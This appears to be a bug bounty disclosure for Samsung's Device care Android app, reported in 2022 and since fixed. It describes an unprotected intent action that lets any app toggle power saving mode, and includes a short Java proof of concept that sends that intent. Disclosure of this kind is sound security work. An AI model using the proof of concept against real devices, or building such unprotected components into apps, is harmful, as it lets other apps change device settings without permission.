# Details

<table>
    <tr>
        <td>Name</td>
        <td>Device care</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.lool</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.20</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.12.06</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$250</td>
    </tr>
</table>

# Description

Oversecured report:
![](Oversecured_report.png)

Oversecured found a handling of the action `com.samsung.android.sm.ACTION_BATTERY_SAVER_SETTINGS` in the Device care app. Depending on the external parameter `turn on off power saving mode`, the app either turned power saving on or off.

**Proof of Concept**

Enabling power saving:
```java
Intent i = new Intent("com.samsung.android.sm.ACTION_BATTERY_SAVER_SETTINGS");
i.putExtra("psmType", "not_empty");
i.putExtra("turn on off power saving mode", true);
startActivity(i);
```
